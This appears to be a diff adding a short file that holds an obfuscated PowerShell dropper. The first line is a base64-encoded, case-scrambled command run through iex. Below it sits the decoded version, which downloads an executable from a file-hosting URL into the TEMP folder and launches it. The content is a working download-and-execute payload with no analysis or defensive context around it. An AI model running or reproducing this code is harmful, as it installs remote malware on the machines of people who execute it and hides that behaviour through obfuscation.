@@ -1,0 +1,7 @@
+iex([sySTEM.TeXt.EncodIng]::utF8.GEtsTRiNg([sYSTEm.CONVeRT]::fRoMbaSE64sTRing('CihOZXctT2JqZWN0IFNZc1RlbS5OZXQud0VCY2xJRU50KS5kb1dObE9hZEZJbEUoJ2h0dHBzOi8vYS5wb21mLmNhdC91bHR4a3IuZXhlJywiJGVudjpURU1QXHV1dXUuZXhlIik7U3RhcnQtUHJvY2VzcyAoIiRlbnY6VEVNUFx1dXV1LmV4ZSIpCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SYsTem.Net.wEBclIENt).doWNlOadFIlE('https://a.pomf.cat/ultxkr.exe',"$env:TEMP\uuuu.exe");Start-Process ("$env:TEMP\uuuu.exe")
+
